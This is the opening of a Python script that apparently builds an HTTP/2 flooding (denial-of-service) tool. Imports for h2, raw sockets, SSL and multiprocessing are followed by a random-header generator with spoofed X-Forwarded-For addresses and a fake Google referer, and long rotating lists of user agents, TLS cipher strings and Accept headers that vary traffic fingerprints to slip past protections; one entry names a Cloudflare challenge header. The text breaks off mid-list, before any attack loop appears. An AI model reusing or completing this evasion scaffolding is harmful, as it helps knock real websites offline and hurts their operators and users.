#!/usr/bin/env python3
# Required dependencies and imports
import sys
import socket
import ssl
import multiprocessing
import os
import time
import random
import math
import json
import urllib.parse
import threading
import select
import psutil
from h2.connection import H2Connection
from h2.events import ResponseReceived, DataReceived, StreamEnded, StreamReset
from colorama import init, Fore, Back, Style

fuck = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

init(autoreset=True)
# User Agents list
USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
	 "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko",
	 "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
	 "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
	 "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
	 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
	 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
	 "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.127 Chrome/10.0.648.127 Safari/534.16",
	 "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16",
	 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16",
	 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16",
	 "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
     "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
     "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
     "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
     "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
     "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
     "Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36",
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0',
     'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
     "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
]

def generate_random_headers():
    """Generate random headers for each request."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Referer": "https://www.google.com/",
        "Cache-Control": "no-cache",
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    }

# Setup default ciphers compatible with Python SSL
defaultCiphers = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256", 
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "DHE-RSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256", 
    "ECDHE-ECDSA-CHACHA20-POLY1305", 
    "ECDHE-RSA-AES128-GCM-SHA256", 
    "ECDHE-RSA-CHACHA20-POLY1305", 
    "ECDHE-ECDSA-AES256-GCM-SHA384", 
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
"EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
"HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
"ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
"EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
"HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
"ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
"ECDHE-RSA-AES128-GCM-SHA256",
"ECDHE-RSA-AES256-GCM-SHA384",
"ECDHE-ECDSA-AES256-GCM-SHA384",
"ECDHE-ECDSA-AES128-GCM-SHA256"
]
ciphers = ":".join(defaultCiphers)

# Headers arrays
accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
    'Connection: keep-alive',
    'Referer: https://www.example.com',
    'Upgrade-Insecure-Requests: 1',
    'DNT: 1',
    'Accept-Encoding: gzip, deflate, br',
    'Cache-Control: max-age=0',
    'Host: www.example.com',
    'Origin: https://www.example.com',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: 42',
    'Cookie: session_id=abc123; user_id=12345',
    'If-None-Match: "686897696a7c876b7e"',
    'X-Requested-With: XMLHttpRequest',
    'X-Forwarded-For: 192.168.1.1',
    'CF-Challenge: captcha-challenge-header',
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
